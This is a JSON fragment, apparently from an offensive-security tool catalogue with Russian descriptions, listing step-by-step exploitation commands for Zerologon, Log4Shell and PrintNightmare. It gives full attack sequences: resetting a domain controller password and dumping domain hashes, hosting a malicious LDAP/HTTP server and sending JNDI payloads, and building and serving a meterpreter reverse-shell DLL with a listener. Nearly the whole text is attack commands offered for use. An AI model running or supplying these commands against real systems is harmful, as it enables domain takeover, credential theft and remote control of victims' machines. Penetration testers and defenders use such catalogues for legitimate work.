  {
    "id": "TOOL-007",
    "name": "impacket / zerologon",
    "type": "exploitation",
    "description": "Python-библиотека для работы с сетевыми протоколами Windows + exploit Zerologon",
    "url": "https://github.com/SecureAuthCorp/impacket",
    "applicable_attack_types": ["privilege_escalation"],
    "applicable_cve": ["CVE-2020-1472"],
    "commands": {
      "CVE-2020-1472": [
        "# Установка impacket",
        "pip install impacket",
        "",
        "# Проверка уязвимости Zerologon",
        "python3 zerologon_tester.py <DC_HOSTNAME> <DC_IP>",
        "",
        "# Эксплуатация — сброс пароля DC",
        "python3 cve-2020-1472-exploit.py <DC_HOSTNAME> <DC_IP>",
        "",
        "# После эксплуатации — дамп хешей через secretsdump",
        "python3 secretsdump.py -no-pass -just-dc <DOMAIN>/<DC_HOSTNAME>\\$@<DC_IP>",
        "",
        "# Восстановление пароля (для учебной среды!)",
        "python3 restorepassword.py <DOMAIN>/<DC_HOSTNAME>@<DC_IP> -target-ip <DC_IP> -hexpass <ORIGINAL_HASH>"
      ]
    },
    "phases": ["Exploitation", "Post-Exploitation"],
    "skill_level": "Advanced",
    "os": ["Linux"]
  },
  {
    "id": "TOOL-008",
    "name": "Log4Shell PoC",
    "type": "exploitation",
    "description": "Инструмент для тестирования уязвимости Log4Shell (CVE-2021-44228)",
    "url": "https://github.com/woodpecker-appstore/log4j-payload-generator",
    "applicable_attack_types": ["remote_code_execution"],
    "applicable_cve": ["CVE-2021-44228"],
    "commands": {
      "CVE-2021-44228": [
        "# Шаг 1: Запустите LDAP-сервер (marshalsec)",
        "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://<YOUR_IP>:8888/#Exploit\"",
        "",
        "# Шаг 2: Создайте payload класс (Exploit.java)",
        "# public class Exploit { static { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (Exception e) {} } }",
        "javac Exploit.java",
        "",
        "# Шаг 3: Хостите класс на HTTP",
        "python3 -m http.server 8888",
        "",
        "# Шаг 4: Отправьте JNDI payload в уязвимое поле",
        "curl -H 'X-Api-Version: ${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/",
        "",
        "# Альтернативный вектор — User-Agent",
        "curl -A '${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/"
      ]
    },
    "phases": ["Exploitation"],
    "skill_level": "Advanced",
    "os": ["Linux"]
  },
  {
    "id": "TOOL-009",
    "name": "PrintNightmare PoC (cube0x0)",
    "type": "exploitation",
    "description": "Эксплойт PrintNightmare для локального/удалённого выполнения кода",
    "url": "https://github.com/cube0x0/CVE-2021-1675",
    "applicable_attack_types": ["remote_code_execution"],
    "applicable_cve": ["CVE-2021-34527"],
    "commands": {
      "CVE-2021-34527": [
        "# Установка зависимостей",
        "pip3 install impacket",
        "",
        "# Проверка уязвимости",
        "rpcdump.py @<TARGET_IP> | grep -A 4 'MS-RPRN'",
        "",
        "# Создание вредоносной DLL (msfvenom)",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o shell.dll",
        "",
        "# Хостим DLL через SMB (impacket)",
        "python3 smbserver.py share . -smb2support",
        "",
        "# Запуск эксплойта",
        "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> '\\\\<YOUR_IP>\\share\\shell.dll'",
        "",
        "# Запуск Metasploit listener",
        "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; run'"
      ]
    },
    "phases": ["Exploitation", "Post-Exploitation"],
    "skill_level": "Advanced",
    "os": ["Linux"]
  },
